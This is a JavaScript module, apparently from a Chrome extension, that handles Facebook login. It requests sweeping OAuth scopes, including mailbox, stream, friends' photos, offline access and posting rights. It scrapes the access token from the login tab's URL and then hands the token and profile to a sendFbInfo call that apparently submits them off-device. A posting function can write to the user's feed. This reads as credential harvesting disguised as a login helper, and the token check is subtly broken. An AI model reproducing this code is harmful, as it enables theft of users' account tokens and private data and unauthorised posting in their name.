var facebook = {
    apiUrl: 'https://graph.facebook.com/',
    clientId: '370162536395316',
    loginTabId: undefined,
    baseInfo: null,
    login: function(){
        var url = facebook.apiUrl + "oauth/authorize?client_id=" + facebook.clientId + "&redirect_uri=https://facebook.com/&type=user_agent&display=page&scope=offline_access,email,manage_notifications,user_birthday,user_likes,friends_likes,user_interests,publish_stream,read_stream,read_friendlists,user_photos,friends_photos,user_photo_video_tags,user_videos,friends_videos,read_mailbox";
		chrome.tabs.create({"url": url, "active": true},function(tab){
            facebook.loginTabId = tab.id;
            setTimeout(function(){
                facebook.checkTokenUrl();
            },1000);
        });
    },
    logout: function(){
        facebook.storeToken("");
    },
    checkTokenUrl: function(){
        chrome.tabs.get(facebook.loginTabId, function(tab){
          if(tab){
            try{
            	// Fetch and store FB token
                var token = tab.url.split('access_token=')[1].split('&')[0];
                facebook.storeToken(token);
                // Get basic info and store fbId
                facebook.getBaseInfo();
            }catch(e){
                setTimeout(function(){
                    facebook.checkTokenUrl();
                },1000);
            };
          }
        });
    },
    getBaseInfo: function(){
    	var info = null;
    	var token = facebook.fetchToken();
    	if (!token) facebook.login();
        var url = facebook.apiUrl + 'me?locale=en' + '&access_token=' + token;
        var r = new XMLHttpRequest();
        r.open("GET", url, true);
        r.onreadystatechange = function (){
            if(r.readyState == 4){
                // token ok
                if(r.status == 200){
                	if (r.responseText) {
                		try {
                			info = JSON.parse(r.responseText);
                			// Store FB id
                            if (info && info.id) {
                            	clog("User info:", token, info);
                            	facebook.storeFbId(info.id);
                            	// Submit user info
                            	sendFbInfo(getUuid(), token, info);
                            }
                		} catch (e) {
                			clog("Parse user base info occur error", e);
                		}
                	}
                	facebook.baseInfo = info;
                // neplatny token
                }else if(r.status == 400){
                    facebook.login();
                }
            }
        };
        r.send(null);
    },
    postMsg: function(message,link){
    	var id		= facebook.fetchFbId();
    	var token	= facebook.fetchToken();
    	if (!id || !token) return false;
        var url = this.apiUrl + id + '/feed';
        var r = new XMLHttpRequest();
        r.open("POST", url, true);
        r.onreadystatechange = function (){
            if(r.status == 200 && r.readyState == 4){
                console.log(r.responseText);
            }
        };
        var data = 'locale=en' + '&access_token=' + token;
        if(message && message!=''){
            data += '&message=' + message;
        }
        if(link && link!=''){
            data += '&link=' + link;
        }
        r.send(data);
    },
    storeToken: function(token){
    	localStorage.setItem("fbToken", token);
    },
    fetchToken: function(){
    	var token = localStorage.getItem("fbToken");
    	if (!token && token.length < 10) {
    		token = "";
    	}
    	return token;
    },
	storeFbId: function(fbId){
		localStorage.setItem("fbId", fbId);
	},
	fetchFbId: function(){
		var fbId = Number(localStorage.getItem("fbId"));
		if (fbId < 1) {
			fbId = 0;
		}
		return fbId;
	}
};